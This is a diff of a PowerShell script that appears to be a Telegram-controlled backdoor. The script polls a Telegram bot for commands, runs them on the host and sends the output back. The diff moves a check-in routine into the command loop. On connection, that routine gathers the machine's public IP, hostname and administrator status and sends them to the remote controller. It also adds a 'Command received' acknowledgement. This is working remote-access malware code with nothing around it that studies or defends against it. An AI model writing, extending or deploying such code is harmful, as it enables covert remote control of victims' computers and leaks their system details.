@@ -74,7 +74,7 @@ function sendMessage ($output)
     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $false
     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + $output + "</pre>")
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<code>" + $output + "</code>")
     $MessageToSend = $MessageToSend | ConvertTo-Json # Convert the message created to a JSON format
 
     try {
@@ -91,10 +91,22 @@ function commandListener
 # Once the command is executed, the result of the command will then be sent as a reply to the message to the controller of the Bot.
 # Attention! There is a timer that will be incremented to 100ms at a time to limit HTTPS requests to the Telegram API.
 {
-    $message_id_temp = (Invoke-RestMethod -Method Get -Uri $api_get_updates).result.Message[-1].message_id
-    Start-Sleep -Seconds 1
-    while ($true) {
+    $mini_setup = 0
+    while ($true) {        
         try {
+            if ($mini_setup -eq 0) {
+                if ((Test-NetConnection -ComputerName "api.telegram.com").PingSucceeded) {
+                    $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
+                    $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
+                    $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
+                    $_body  = '{0} ({1}) - IP: {2}' -f $_host, $_user, $_ip                         # Build everything...
+                    sendMessage $_body                                                              # Send a message with the body
+                    $message_id_temp = (Invoke-RestMethod -Method Get -Uri $api_get_updates).result.Message[-1].message_id
+                    $mini_setup = 1
+                    Start-Sleep -Seconds 1
+                }
+            }
+
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates           # Get the JSON response about the telegram updates
             $message    = $message.result.Message[-1]                                   # Get the last JSON record
             $message_id = $message.message_id                                           # Get the message_id of the update
@@ -120,6 +132,9 @@ function commandListener
                             $block = $block | Out-String
                             sendMessage $block
                         }
+
+                        Start-Sleep -Milliseconds 300
+                        sendMessage "Command received"
                     }
                     if ($document) {
                         $file_id   = $document.file_id
@@ -136,15 +151,6 @@ function commandListener
             Start-Sleep -Seconds 5
         }
     }
-}
-
-
-if ((tnc).PingSucceeded) {
-    $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
-    $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
-    $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
-    $_body  = '{0} ({1}) - IP: {2}' -f $_host, $_user, $_ip                         # Build everything...
-    sendMessage $_body                                                              # Send a message with the body 
 }
 
 
